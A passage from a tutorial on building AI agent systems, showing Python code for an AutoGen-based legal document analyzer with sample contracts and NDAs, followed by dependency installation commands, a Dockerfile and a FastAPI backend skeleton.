        analysis_summary = json.dumps(analysis_data, indent=2)
        
        # Generate initial prompt for the agent team
        analysis_prompt = f"""
        LEGAL DOCUMENT ANALYSIS
        Analysis ID: {analysis_id}
        Document Type: {document_type if document_type else 'Unknown'}
        Jurisdiction: {jurisdiction if jurisdiction else 'Unknown'}
        Industry: {industry if industry else 'Unknown'}
        
        I need your collaborative analysis of this legal document. Initial automated analysis has identified the following:
        
        DOCUMENT STRUCTURE:
        Type: {structure.get('document_type', 'Unknown')}
        Jurisdiction: {structure.get('jurisdiction', 'Unknown')}
        Date: {structure.get('date', 'Unknown')}
        Parties: {', '.join(str(p) for p in structure.get('parties', []))}
        
        DOCUMENT EXCERPT:
        {document_excerpt}
        
        DETAILED ANALYSIS RESULTS:
        {analysis_summary}
        
        I need the team to work together to provide:
        1. DocumentParser: Analyze the document structure and identify key provisions
        2. LegalResearcher: Analyze relevant case law and legal precedents
        3. ComplianceAnalyst: Evaluate regulatory compliance issues
        4. IssueSpotter: Identify legal risks and potential issues
        5. LegalSummarizer: Create a comprehensive yet concise summary of findings
        
        The LegalAnalysisCoordinator (me) will coordinate your work. Please be specific, thorough, and actionable in your analysis.
        """
        
        # Start the group chat
        result = self.user_proxy.initiate_chat(
            manager,
            message=analysis_prompt
        )
        
        # Extract the final summary
        final_summary = None
        for message in reversed(self.user_proxy.chat_history):
            if message['role'] == 'assistant' and 'LegalSummarizer' in message.get('name', ''):
                final_summary = message['content']
                break
        
        if not final_summary:
            # Use the last substantial response if no clear summary
            for message in reversed(self.user_proxy.chat_history):
                if message['role'] == 'assistant' and len(message['content']) > 500:
                    final_summary = message['content']
                    break
        
        # Step 8: Generate document summary
        summary = {
            "executive_summary": "See full summary below",
            "detailed_summary": final_summary
        }
        
        # Step 9: Verify citations
        citation_verification = self.verify_citations(document_text)
        
        # Compile the complete analysis results
        analysis_result = {
            "analysis_id": analysis_id,
            "timestamp": datetime.datetime.now().isoformat(),
            "document_type": document_type,
            "jurisdiction": jurisdiction,
            "industry": industry,
            "structure": structure,
            "entities": entities,
            "rights_obligations": rights_obligations,
            "relevant_case_law": case_law,
            "applicable_regulations": regulations,
            "compliance_assessment": compliance,
            "legal_issues": issues,
            "citation_verification": citation_verification,
            "summary": summary,
            "metadata": {
                "document_length": len(document_text),
                "analysis_version": "1.0"
            }
        }
        
        # Save to analysis history
        self.analysis_history[analysis_id] = {
            "timestamp": datetime.datetime.now().isoformat(),
            "document_type": document_type,
            "jurisdiction": jurisdiction,
            "industry": industry,
            "summary": summary.get("executive_summary", "")
        }
        
        # Save analysis history
        try:
            with open(self.history_path, 'w') as f:
                json.dump(self.analysis_history, f, indent=2)
            print("Analysis history saved successfully")
        except Exception as e:
            print(f"Error saving analysis history: {e}")
        
        return analysis_result
    
    def get_analysis_history(self) -> Dict[str, Dict[str, Any]]:
        """
        Get the history of document analyses.
        
        Returns:
            Dictionary with analysis history
        """
        return self.analysis_history
    
    def compare_documents(self, document1_text: str, document2_text: str, comparison_type: str = "general") -> Dict[str, Any]:
        """
        Compare two legal documents and identify differences.
        
        Args:
            document1_text: Text of first document
            document2_text: Text of second document
            comparison_type: Type of comparison (general, clause, version)
            
        Returns:
            Dictionary with comparison results
        """
        try:
            # Extract structure for both documents
            structure1 = self.extract_document_structure(document1_text)
            structure2 = self.extract_document_structure(document2_text)
            
            # Prepare comparison prompt based on comparison type
            if comparison_type == "clause":
                # Detailed clause-by-clause comparison
                comparison_prompt = f"""Compare these two legal documents clause by clause. Identify:
                1. Clauses that appear in both documents but have differences
                2. Clauses that appear only in Document 1
                3. Clauses that appear only in Document 2
                4. Changes in legal obligations, rights, or liabilities
                5. The legal implications of these differences
                
                Document 1 structure:
                {json.dumps(structure1, indent=2)}
                
                Document 2 structure:
                {json.dumps(structure2, indent=2)}
                
                Provide a clause-by-clause comparison with specific references to the differences and their legal implications.
                """
            elif comparison_type == "version":
                # Version comparison (e.g., different versions of same document)
                comparison_prompt = f"""Compare these two versions of the legal document. Identify:
                1. All changes between versions, highlighting additions, deletions, and modifications
                2. The significance of each change
                3. How the changes affect legal obligations, rights, or liabilities
                4. Whether the changes strengthen or weaken any party's position
                5. Any new risks or opportunities introduced by the changes
                
                Original document:
                {document1_text[:5000]}
                
                New version:
                {document2_text[:5000]}
                
                Focus on substantive changes rather than formatting differences.
                """
            else:
                # General comparison
                comparison_prompt = f"""Compare these two legal documents. Identify:
                1. Key similarities and differences
                2. Differences in scope, obligations, rights, and liabilities
                3. Relative advantages and disadvantages for involved parties
                4. Which document provides better protections and for whom
                5. Recommendations based on the comparison
                
                Document 1:
                Type: {structure1.get('document_type', 'Unknown')}
                {document1_text[:3000]}
                
                Document 2:
                Type: {structure2.get('document_type', 'Unknown')}
                {document2_text[:3000]}
                
                Provide a comprehensive comparison with specific references to important differences.
                """
            
            # Use OpenAI to generate comparison
            response = client.chat.completions.create(
                model="gpt-4-turbo",
                messages=[
                    {"role": "system", "content": "You are a legal document comparison specialist who identifies and analyzes differences between legal documents."},
                    {"role": "user", "content": comparison_prompt}
                ],
                temperature=0.3,
                response_format={"type": "json_object"}
            )
            
            # Parse the response
            comparison = json.loads(response.choices[0].message.content)
            
            # Add document metadata to comparison
            comparison["document1_metadata"] = {
                "document_type": structure1.get("document_type", "Unknown"),
                "jurisdiction": structure1.get("jurisdiction", "Unknown"),
                "date": structure1.get("date", "Unknown"),
                "parties": structure1.get("parties", [])
            }
            
            comparison["document2_metadata"] = {
                "document_type": structure2.get("document_type", "Unknown"),
                "jurisdiction": structure2.get("jurisdiction", "Unknown"),
                "date": structure2.get("date", "Unknown"),
                "parties": structure2.get("parties", [])
            }
            
            return comparison
            
        except Exception as e:
            print(f"Error comparing documents: {e}")
            return {
                "error": str(e),
                "comparison_type": comparison_type,
                "document1_excerpt": document1_text[:100] + "...",
                "document2_excerpt": document2_text[:100] + "..."
            }

# Example usage
if __name__ == "__main__":
    # Create the legal document analyzer
    legal_analyzer = LegalDocumentAnalyzer()
    
    # Example contract
    example_contract = """
    SERVICE AGREEMENT
    
    This Service Agreement (the "Agreement") is entered into as of January 15, 2023 (the "Effective Date"), by and between ABC Technology Solutions, Inc., a Delaware corporation with its principal place of business at 123 Tech Lane, San Francisco, CA 94105 ("Provider"), and XYZ Corporation, a Nevada corporation with its principal place of business at 456 Business Avenue, Las Vegas, NV 89101 ("Client").
    
    WHEREAS, Provider is in the business of providing cloud computing and software development services; and
    
    WHEREAS, Client desires to engage Provider to provide certain services as set forth herein.
    
    NOW, THEREFORE, in consideration of the mutual covenants and agreements contained herein, the parties agree as follows:
    
    1. SERVICES
    
    1.1 Services. Provider shall provide to Client the services (the "Services") described in each Statement of Work executed by the parties and attached hereto as Exhibit A. Additional Statements of Work may be added to this Agreement upon mutual written agreement of the parties.
    
    1.2 Change Orders. Either party may request changes to the scope of Services by submitting a written change request. No change shall be effective until mutually agreed upon by both parties in writing.
    
    2. TERM AND TERMINATION
    
    2.1 Term. This Agreement shall commence on the Effective Date and shall continue for a period of three (3) years, unless earlier terminated as provided herein (the "Initial Term"). Thereafter, this Agreement shall automatically renew for successive one (1) year periods (each, a "Renewal Term"), unless either party provides written notice of non-renewal at least ninety (90) days prior to the end of the then-current term.
    
    2.2 Termination for Convenience. Client may terminate this Agreement or any Statement of Work, in whole or in part, for convenience upon thirty (30) days' prior written notice to Provider. In the event of such termination, Client shall pay Provider for all Services provided up to the effective date of termination.
    
    2.3 Termination for Cause. Either party may terminate this Agreement immediately upon written notice if the other party: (a) commits a material breach of this Agreement and fails to cure such breach within thirty (30) days after receiving written notice thereof; or (b) becomes insolvent, files for bankruptcy, or makes an assignment for the benefit of creditors.
    
    3. COMPENSATION
    
    3.1 Fees. Client shall pay Provider the fees set forth in each Statement of Work.
    
    3.2 Invoicing and Payment. Provider shall invoice Client monthly for Services performed. Client shall pay all undisputed amounts within thirty (30) days of receipt of invoice. Late payments shall accrue interest at the rate of 1.5% per month or the highest rate permitted by law, whichever is lower.
    
    3.3 Taxes. All fees are exclusive of taxes. Client shall be responsible for all sales, use, and excise taxes, and any other similar taxes, duties, and charges imposed by any federal, state, or local governmental entity.
    
    4. INTELLECTUAL PROPERTY
    
    4.1 Client Materials. Client shall retain all right, title, and interest in and to all materials provided by Client to Provider (the "Client Materials").
    
    4.2 Provider Materials. Provider shall retain all right, title, and interest in and to all materials that Provider owned prior to the Effective Date or develops independently of its obligations under this Agreement (the "Provider Materials").
    
    4.3 Work Product. Upon full payment of all amounts due under this Agreement, Provider hereby assigns to Client all right, title, and interest in and to all materials developed specifically for Client under this Agreement (the "Work Product"), excluding any Provider Materials.
    
    4.4 License to Provider Materials. Provider hereby grants to Client a non-exclusive, non-transferable, worldwide license to use the Provider Materials solely to the extent necessary to use the Work Product.
    
    5. CONFIDENTIALITY
    
    5.1 Definition. "Confidential Information" means all non-public information disclosed by one party (the "Disclosing Party") to the other party (the "Receiving Party"), whether orally or in writing, that is designated as confidential or that reasonably should be understood to be confidential given the nature of the information and the circumstances of disclosure.
    
    5.2 Obligations. The Receiving Party shall: (a) protect the confidentiality of the Disclosing Party's Confidential Information using the same degree of care that it uses to protect the confidentiality of its own confidential information of like kind (but in no event less than reasonable care); (b) not use any Confidential Information for any purpose outside the scope of this Agreement; and (c) not disclose Confidential Information to any third party without prior written consent.
    
    5.3 Exclusions. Confidential Information shall not include information that: (a) is or becomes generally known to the public; (b) was known to the Receiving Party prior to its disclosure by the Disclosing Party; (c) is received from a third party without restriction; or (d) was independently developed without use of Confidential Information.
    
    6. REPRESENTATIONS AND WARRANTIES
    
    6.1 Provider Warranties. Provider represents and warrants that: (a) it has the legal right to enter into this Agreement and perform its obligations hereunder; (b) the Services will be performed in a professional and workmanlike manner in accordance with generally accepted industry standards; and (c) the Services and Work Product will not infringe the intellectual property rights of any third party.
    
    6.2 Disclaimer. EXCEPT AS EXPRESSLY SET FORTH IN THIS AGREEMENT, PROVIDER MAKES NO WARRANTIES OF ANY KIND, WHETHER EXPRESS, IMPLIED, STATUTORY OR OTHERWISE, AND SPECIFICALLY DISCLAIMS ALL IMPLIED WARRANTIES, INCLUDING ANY WARRANTIES OF MERCHANTABILITY OR FITNESS FOR A PARTICULAR PURPOSE, TO THE MAXIMUM EXTENT PERMITTED BY APPLICABLE LAW.
    
    7. LIMITATION OF LIABILITY
    
    7.1 Exclusion of Indirect Damages. NEITHER PARTY SHALL BE LIABLE TO THE OTHER PARTY FOR ANY INDIRECT, INCIDENTAL, CONSEQUENTIAL, SPECIAL, PUNITIVE, OR EXEMPLARY DAMAGES ARISING OUT OF OR RELATED TO THIS AGREEMENT, EVEN IF THE PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.
    
    7.2 Cap on Liability. EACH PARTY'S TOTAL CUMULATIVE LIABILITY ARISING OUT OF OR RELATED TO THIS AGREEMENT SHALL NOT EXCEED THE TOTAL AMOUNT PAID BY CLIENT UNDER THIS AGREEMENT DURING THE TWELVE (12) MONTHS IMMEDIATELY PRECEDING THE EVENT GIVING RISE TO LIABILITY.
    
    7.3 Exceptions. The limitations in Sections 7.1 and 7.2 shall not apply to: (a) breaches of confidentiality obligations; (b) infringement of intellectual property rights; (c) breaches of Section 8 (Indemnification); or (d) a party's gross negligence, fraud, or willful misconduct.
    
    8. INDEMNIFICATION
    
    8.1 Provider Indemnification. Provider shall defend, indemnify, and hold harmless Client from and against any claim, demand, suit, or proceeding made or brought against Client by a third party alleging that the Services or Work Product infringes such third party's intellectual property rights (an "Infringement Claim").
    
    8.2 Client Indemnification. Client shall defend, indemnify, and hold harmless Provider from and against any claim, demand, suit, or proceeding made or brought against Provider by a third party arising out of Client's use of the Services or Work Product in violation of this Agreement or applicable law.
    
    9. GENERAL
    
    9.1 Independent Contractors. The parties are independent contractors. This Agreement does not create a partnership, franchise, joint venture, agency, fiduciary, or employment relationship between the parties.
    
    9.2 Notices. All notices under this Agreement shall be in writing and shall be deemed given when delivered personally, by email (with confirmation of receipt), or by certified mail (return receipt requested) to the address specified below or such other address as may be specified in writing.
    
    9.3 Assignment. Neither party may assign this Agreement without the prior written consent of the other party; provided, however, that either party may assign this Agreement to a successor in the event of a merger, acquisition, or sale of all or substantially all of its assets.
    
    9.4 Governing Law. This Agreement shall be governed by the laws of the State of California without regard to its conflict of laws provisions.
    
    9.5 Dispute Resolution. Any dispute arising out of or relating to this Agreement shall be resolved by binding arbitration in San Francisco, California, in accordance with the Commercial Arbitration Rules of the American Arbitration Association.
    
    9.6 Entire Agreement. This Agreement constitutes the entire agreement between the parties regarding the subject matter hereof and supersedes all prior or contemporaneous agreements, understandings, and communication, whether written or oral.
    
    9.7 Severability. If any provision of this Agreement is held to be unenforceable or invalid, such provision shall be changed and interpreted to accomplish the objectives of such provision to the greatest extent possible under applicable law, and the remaining provisions shall continue in full force and effect.
    
    9.8 Waiver. No waiver of any provision of this Agreement shall be effective unless in writing and signed by the party against whom the waiver is sought to be enforced. No failure or delay by either party in exercising any right under this Agreement shall constitute a waiver of that right.
    
    9.9 Force Majeure. Neither party shall be liable for any failure or delay in performance under this Agreement due to causes beyond its reasonable control, including acts of God, natural disasters, terrorism, riots, or war.
    
    9.10 Survival. The provisions of Sections 4, 5, 6.2, 7, 8, and 9 shall survive the termination or expiration of this Agreement.
    
    IN WITNESS WHEREOF, the parties have executed this Agreement as of the Effective Date.
    
    ABC TECHNOLOGY SOLUTIONS, INC.
    
    By: ______________________________
    Name: John Smith
    Title: Chief Executive Officer
    
    XYZ CORPORATION
    
    By: ______________________________
    Name: Jane Doe
    Title: Chief Technology Officer
    """
    
    # Analyze the document
    analysis = legal_analyzer.analyze_document(
        document_text=example_contract,
        document_type="Service Agreement",
        industry="Technology"
    )
    
    print("=== Document Analysis ===")
    print(f"Analysis ID: {analysis['analysis_id']}")
    print(f"Document Type: {analysis['document_type']}")
    
    # Print structure overview
    structure = analysis.get("structure", {})
    print("\nDocument Structure:")
    print(f"Type: {structure.get('document_type', 'Unknown')}")
    print(f"Jurisdiction: {structure.get('jurisdiction', 'Unknown')}")
    print(f"Date: {structure.get('date', 'Unknown')}")
    print(f"Parties: {', '.join(str(p) for p in structure.get('parties', []))}")
    
    # Print key legal issues
    issues = analysis.get("legal_issues", {}).get("issues", [])
    print("\nKey Legal Issues:")
    for issue in issues[:3]:  # Print top 3 issues
        print(f"- {issue.get('description', 'Unknown issue')} (Severity: {issue.get('severity', 'Unknown')})")
    
    # Print compliance assessment
    compliance = analysis.get("compliance_assessment", {})
    print(f"\nCompliance Score: {compliance.get('compliance_score', 'N/A')}")
    
    # Print relevant case law
    case_law = analysis.get("relevant_case_law", [])
    print("\nRelevant Case Law:")
    for case in case_law[:2]:  # Print top 2 cases
        print(f"- {case.get('case_name', 'Unknown case')} ({case.get('citation', 'No citation')})")
    
    # Print executive summary
    summary = analysis.get("summary", {})
    exec_summary = summary.get("executive_summary", "No summary available")
    print("\nExecutive Summary:")
    print(exec_summary[:500] + "..." if len(exec_summary) > 500 else exec_summary)
```

**Usage Example:**

```python
from legal_document_analyzer import LegalDocumentAnalyzer

# Initialize the analyzer
legal_analyzer = LegalDocumentAnalyzer()

# Sample NDA document
nda_document = """
MUTUAL NON-DISCLOSURE AGREEMENT

This Mutual Non-Disclosure Agreement (this "Agreement") is made effective as of May 10, 2023 (the "Effective Date") by and between Alpha Innovations, LLC, a Delaware limited liability company with its principal place of business at 567 Innovation Way, Boston, MA 02110 ("Company A"), and Beta Technologies Inc., a California corporation with its principal place of business at 890 Tech Boulevard, San Jose, CA 95110 ("Company B").

1. PURPOSE
The parties wish to explore a potential business relationship in connection with a joint development project (the "Purpose"). This Agreement is intended to allow the parties to continue to discuss and evaluate the Purpose while protecting the parties' Confidential Information (as defined below) against unauthorized use or disclosure.

2. DEFINITION OF CONFIDENTIAL INFORMATION
"Confidential Information" means any information disclosed by either party ("Disclosing Party") to the other party ("Receiving Party"), either directly or indirectly, in writing, orally or by inspection of tangible objects, which is designated as "Confidential," "Proprietary" or some similar designation, or that should reasonably be understood to be confidential given the nature of the information and the circumstances of disclosure. Confidential Information includes, without limitation, technical data, trade secrets, know-how, research, product plans, products, services, customer lists, markets, software, developments, inventions, processes, formulas, technology, designs, drawings, engineering, hardware configuration information, marketing, financial or other business information. Confidential Information shall not include any information that (i) was publicly known prior to the time of disclosure; (ii) becomes publicly known after disclosure through no action or inaction of the Receiving Party; (iii) is already in the possession of the Receiving Party at the time of disclosure; (iv) is obtained by the Receiving Party from a third party without a breach of such third party's obligations of confidentiality; or (v) is independently developed by the Receiving Party without use of or reference to the Disclosing Party's Confidential Information.

3. NON-USE AND NON-DISCLOSURE
The Receiving Party shall not use any Confidential Information of the Disclosing Party for any purpose except to evaluate and engage in discussions concerning the Purpose. The Receiving Party shall not disclose any Confidential Information of the Disclosing Party to third parties or to the Receiving Party's employees, except to those employees who are required to have the information in order to evaluate or engage in discussions concerning the Purpose and who have signed confidentiality agreements with the Receiving Party with terms no less restrictive than those herein.

4. MAINTENANCE OF CONFIDENTIALITY
The Receiving Party shall take reasonable measures to protect the secrecy of and avoid disclosure and unauthorized use of the Confidential Information of the Disclosing Party. Without limiting the foregoing, the Receiving Party shall take at least those measures that it takes to protect its own most highly confidential information and shall promptly notify the Disclosing Party of any unauthorized use or disclosure of Confidential Information of which it becomes aware. The Receiving Party shall reproduce the Disclosing Party's proprietary rights notices on any copies of Confidential Information, in the same manner in which such notices were set forth in or on the original.

5. RETURN OF MATERIALS
All documents and other tangible objects containing or representing Confidential Information that have been disclosed by either party to the other party, and all copies thereof which are in the possession of the other party, shall be and remain the property of the Disclosing Party and shall be promptly returned to the Disclosing Party or destroyed upon the Disclosing Party's written request.

6. NO LICENSE
Nothing in this Agreement is intended to grant any rights to either party under any patent, copyright, trade secret or other intellectual property right of the other party, nor shall this Agreement grant any party any rights in or to the Confidential Information of the other party except as expressly set forth herein.

7. TERM AND TERMINATION
This Agreement shall remain in effect for a period of three (3) years from the Effective Date. Notwithstanding the foregoing, the Receiving Party's obligations with respect to the Confidential Information of the Disclosing Party shall survive for a period of five (5) years from the date of disclosure.

8. REMEDIES
The Receiving Party acknowledges that unauthorized disclosure of the Disclosing Party's Confidential Information could cause substantial harm to the Disclosing Party for which damages alone might not be a sufficient remedy. Accordingly, in addition to all other remedies, the Disclosing Party shall be entitled to seek specific performance and injunctive or other equitable relief as a remedy for any breach or threatened breach of this Agreement.

9. MISCELLANEOUS
This Agreement shall bind and inure to the benefit of the parties hereto and their successors and assigns. This Agreement shall be governed by the laws of the State of New York, without reference to conflict of laws principles. This Agreement contains the entire agreement between the parties with respect to the subject matter hereof, and neither party shall have any obligation, express or implied by law, with respect to trade secret or proprietary information of the other party except as set forth herein. Any failure to enforce any provision of this Agreement shall not constitute a waiver thereof or of any other provision. This Agreement may not be amended, nor any obligation waived, except by a writing signed by both parties hereto.

IN WITNESS WHEREOF, the parties have executed this Agreement as of the Effective Date.

ALPHA INNOVATIONS, LLC

By: _________________________
Name: Robert Johnson
Title: Chief Executive Officer

BETA TECHNOLOGIES INC.

By: _________________________
Name: Sarah Williams
Title: President
"""

# Analyze the NDA document
analysis_result = legal_analyzer.analyze_document(
    document_text=nda_document,
    document_type="Non-Disclosure Agreement",
    jurisdiction="United States",
    industry="Technology"
)

# Print key findings
print("=== NDA DOCUMENT ANALYSIS ===")
print(f"Analysis ID: {analysis_result['analysis_id']}")
print(f"Document Type: {analysis_result['document_type']}")
print(f"Jurisdiction: {analysis_result['jurisdiction']}")

# Print document structure
structure = analysis_result.get("structure", {})
print("\nDOCUMENT STRUCTURE:")
print(f"Parties: {', '.join(str(p) for p in structure.get('parties', []))}")
print(f"Effective Date: {structure.get('date', 'Unknown')}")
print(f"Term: {structure.get('term', 'Unknown')}")

# Print key obligations
obligations = analysis_result.get("rights_obligations", {}).get("obligations", [])
print("\nKEY OBLIGATIONS:")
for obligation in obligations[:3]:  # Print top 3 obligations
    print(f"- {obligation.get('text', 'Unknown')}")
    print(f"  Subject: {obligation.get('subject', 'Unknown')}")

# Print legal issues
issues = analysis_result.get("legal_issues", {}).get("issues", [])
print("\nLEGAL ISSUES AND RISKS:")
for issue in issues[:3]:  # Print top 3 issues
    print(f"- {issue.get('description', 'Unknown issue')}")
    print(f"  Severity: {issue.get('severity', 'Unknown')}")
    print(f"  Recommendation: {issue.get('recommended_remediation', 'N/A')}")

# Print compliance assessment
compliance = analysis_result.get("compliance_assessment", {})
print("\nCOMPLIANCE ASSESSMENT:")
print(f"Overall Compliance Score: {compliance.get('compliance_score', 'N/A')}")

# Print excerpt from detailed summary
summary = analysis_result.get("summary", {}).get("detailed_summary", "No summary available")
print("\nANALYSIS SUMMARY:")
summary_excerpt = summary[:500] + "..." if len(summary) > 500 else summary
print(summary_excerpt)

# Compare with another NDA (simplified example)
other_nda = """
CONFIDENTIALITY AGREEMENT

This Confidentiality Agreement (this "Agreement") is made as of June 1, 2023 by and between Acme Corp., a Nevada corporation ("Company A") and XYZ Enterprises, a Delaware LLC ("Company B").

1. CONFIDENTIAL INFORMATION
"Confidential Information" means all non-public information that Company A designates as being confidential or which under the circumstances surrounding disclosure ought to be treated as confidential by Company B. "Confidential Information" includes, without limitation, information relating to released or unreleased Company A software or hardware products, marketing or promotion of any Company A product, business policies or practices, and information received from others that Company A is obligated to treat as confidential.

2. EXCLUSIONS
"Confidential Information" excludes information that: (i) is or becomes generally known through no fault of Company B; (ii) was known to Company B prior to disclosure; (iii) is rightfully obtained by Company B from a third party without restriction; or (iv) is independently developed by Company B without use of Confidential Information.

3. OBLIGATIONS
Company B shall hold Company A's Confidential Information in strict confidence and shall not disclose such Confidential Information to any third party. Company B shall take reasonable security precautions, at least as great as the precautions it takes to protect its own confidential information.

4. TERM
This Agreement shall remain in effect for 2 years from the date hereof.

5. GOVERNING LAW
This Agreement shall be governed by the laws of the State of California.

IN WITNESS WHEREOF, the parties hereto have executed this Agreement.

ACME CORP.
By: ________________________

XYZ ENTERPRISES
By: ________________________
"""

# Compare the two NDAs
comparison = legal_analyzer.compare_documents(
    document1_text=nda_document,
    document2_text=other_nda,
    comparison_type="clause"
)

# Print comparison highlights
print("\n=== NDA COMPARISON ===")
print("\nKEY DIFFERENCES:")
differences = comparison.get("key_differences", [])
for diff in differences[:3]:  # Print top 3 differences
    print(f"- {diff}")

print("\nRECOMMENDATIONS:")
recommendations = comparison.get("recommendations", [])
for rec in recommendations[:2]:  # Print top 2 recommendations
    print(f"- {rec}")
```

This Legal Document Analyzer agent template demonstrates key legal tech patterns:

1. **Document Structure Analysis**: Extracts hierarchical structure and key provisions from legal documents
2. **Legal Research Integration**: Finds relevant case law and precedents
3. **Compliance Assessment**: Identifies regulatory requirements and compliance issues
4. **Issue Spotting**: Detects potential legal risks and ambiguities
5. **Document Comparison**: Compares legal documents and identifies material differences
6. **Citation Verification**: Validates and verifies legal citations

## 5. Implementation Guide: Setting Up Your AI Agent System

### Installing the Required Dependencies

To build a large-scale AI agent system, you'll need to set up the core dependencies that power your agent infrastructure. The following installation guide covers the essential components for each of our tech stack configurations.

**Base Requirements (All Configurations)**

```bash
# Create and activate a virtual environment
python -m venv agent_env
source agent_env/bin/activate  # On Windows: agent_env\Scripts\activate

# Install base dependencies
pip install -U pip setuptools wheel
pip install -U openai autogen-agentchat langchain langchain-community
pip install -U numpy pandas matplotlib seaborn
pip install -U pydantic python-dotenv
```

**Kubernetes + Ray Serve + AutoGen + LangChain**

For distributed AI workloads with horizontal scaling capabilities:

```bash
# Install Ray and Kubernetes dependencies
pip install -U ray[serve,tune,data,default]
pip install -U kubernetes
pip install -U fastapi uvicorn
pip install -U mlflow optuna

# Install AutoGen with integrations
pip install -U pyautogen[retrievers,graph]

# Install monitoring tools
pip install -U prometheus-client grafana-api
```

**Apache Kafka + FastAPI + AutoGen + ChromaDB**

For real-time AI pipelines with event-driven architecture:

```bash
# Install Kafka and API dependencies
pip install -U confluent-kafka aiokafka
pip install -U fastapi uvicorn
pip install -U redis httpx

# Install vector database
pip install -U chromadb langchain-chroma

# Install monitoring and observability
pip install -U opentelemetry-api opentelemetry-sdk
pip install -U opentelemetry-exporter-otlp
```

**Django/Flask + Celery + AutoGen + Pinecone**

For task orchestration and asynchronous processing:

```bash
# Install web framework and task queue
pip install -U django djangorestframework django-cors-headers
# Or for Flask-based setup:
# pip install -U flask flask-restful flask-cors

pip install -U celery redis flower

# Install vector database
pip install -U pinecone-client langchain-pinecone

# Install schema validation and background tools
pip install -U marshmallow pydantic
pip install -U gunicorn psycopg2-binary
```

**Airflow + AutoGen + OpenAI Functions + Snowflake**

For enterprise AI automation and data pipeline orchestration:

```bash
# Install Airflow with recommended extras
pip install -U apache-airflow[crypto,celery,postgres,redis,ssh]

# Install database connectors
pip install -U snowflake-connector-python
pip install -U snowflake-sqlalchemy
pip install -U snowflake-ml-python

# Install experiment tracking
pip install -U mlflow boto3
```

**Docker Environment Setup**

For containerized deployment, create a `Dockerfile` for your agent service:

```dockerfile
FROM python:3.10-slim

WORKDIR /app

# Install system dependencies
RUN apt-get update && apt-get install -y \
    build-essential \
    curl \
    software-properties-common \
    git \
    && rm -rf /var/lib/apt/lists/*

# Copy requirements file
COPY requirements.txt .

# Install Python dependencies
RUN pip install --no-cache-dir --upgrade pip && \
    pip install --no-cache-dir -r requirements.txt

# Copy application code
COPY . .

# Expose the port your application runs on
EXPOSE 8000

# Set environment variables
ENV PYTHONUNBUFFERED=1

# Run the application
CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000"]
```

### Structuring the Backend with FastAPI or Django

When building a large-scale AI agent system, the backend structure is crucial for maintainability, scalability, and performance. Let's explore both FastAPI and Django approaches:

**FastAPI Backend for AI Agents**

FastAPI is ideal for high-performance, asynchronous API services that need to handle many concurrent agent interactions.

```python
# main.py - Entry point for FastAPI application
import os
import json
import logging
from typing import Dict, List, Any, Optional

import uvicorn
from fastapi import FastAPI, Depends, HTTPException, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel

from agent_system.core import AgentOrchestrator
from agent_system.models import AgentRequest, AgentResponse
from agent_system.auth import get_api_key, get_current_user
from agent_system.config import Settings

# Initialize settings and logging
settings = Settings()
logging.basicConfig(
    level=settings.log_level,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
)
logger = logging.getLogger("agent_api")

# Initialize FastAPI app
app = FastAPI(
    title="AI Agent System API",
    description="API for interacting with an AI agent system",
    version="1.0.0",
)

# Add CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.cors_origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Initialize agent orchestrator
agent_orchestrator = AgentOrchestrator(settings=settings)

# API routes

@app.post("/api/v1/agents/execute", response_model=AgentResponse)
async def execute_agent(
    request: AgentRequest,
    background_tasks: BackgroundTasks,
    api_key: str = Depends(get_api_key),
):
    """Execute an agent with the given parameters."""
    logger.info(f"Received request for agent: {request.agent_type}")
    
    try:
        # For long-running tasks, process in background
        if request.async_execution:
            task_id = agent_orchestrator.generate_task_id()
            background_tasks.add_task(
                agent_orchestrator.execute_agent_task,
                task_id=task_id,
                agent_type=request.agent_type,
                parameters=request.parameters,
                user_id=request.user_id,
            )
            return AgentResponse(
                status="processing",
                task_id=task_id,
                message="Agent task started, check status at /api/v1/tasks/{task_id}",
            )
        
        # For synchronous execution
        result = await agent_orchestrator.execute_agent(
            agent_type=request.agent_type,
            parameters=request.parameters,
            user_id=request.user_id,
        )
        
        return AgentResponse(
            status="completed",
            result=result,
            message="Agent execution complete",
        )
        
    except Exception as e:
        logger.error(f"Error executing agent: {str(e)}", exc_info=True)
        raise HTTPException(status_code=500, detail=f"Agent execution failed: {str(e)}")

@app.get("/api/v1/tasks/{task_id}", response_model=AgentResponse)
async def get_task_status(
    task_id: str,
    api_key: str = Depends(get_api_key),
):
    """Get the status of an agent task."""
    try:
        task_status = agent_orchestrator.get_task_status(task_id)
        
        if not task_status:
            raise HTTPException(status_code=404, detail=f"Task {task_id} not found")
        
        return task_status
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error retrieving task status: {str(e)}", exc_info=True)
        raise HTTPException(status_code=500, detail=f"Error retrieving task status: {str(e)}")

@app.get("/api/v1/agents/types")
async def get_agent_types(
    api_key: str = Depends(get_api_key),
):
    """Get available agent types and capabilities."""
    return {
        "agent_types": agent_orchestrator.get_available_agent_types(),
    }

# Health check endpoint
@app.get("/health")
async def health_check():
    """Health check endpoint."""
    return {"status": "healthy"}

if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=settings.debug)
```

**Agent System Core Structure (FastAPI)**

```python
# agent_system/core.py
import os
import json
import uuid
import time
import asyncio
import logging
from typing import Dict, List, Any, Optional

import autogen
from autogen.agentchat.contrib.gpt_assistant_agent import GPTAssistantAgent

from .config import Settings
from .models import AgentTask, AgentResponse

logger = logging.getLogger("agent_orchestrator")

class AgentOrchestrator:
    """Orchestrates AI agents, managing their lifecycle and execution."""
    
    def __init__(self, settings: Settings):
        """Initialize the agent orchestrator with configuration settings."""
        self.settings = settings
        self.agent_registry = {}  # Maps agent_type to agent factory function
        self.agent_configs = {}   # Maps agent_type to configuration
        self.tasks = {}           # Maps task_id to task status/results
        
        # Initialize the agent registry
        self._initialize_agent_registry()
    
    def _initialize_agent_registry(self):
        """Register available agent types with their factory functions."""
        # Register default agent types
        self.register_agent_type(
            "general_assistant",
            self._create_general_assistant,
            {
                "description": "General-purpose assistant for wide-ranging questions",
                "parameters": {
                    "temperature": 0.7,
                    "streaming": True
                }
            }
        )
        
        self.register_agent_type(
            "code_assistant",
            self._create_code_assistant,
            {
                "description": "Specialized assistant for coding and software development",
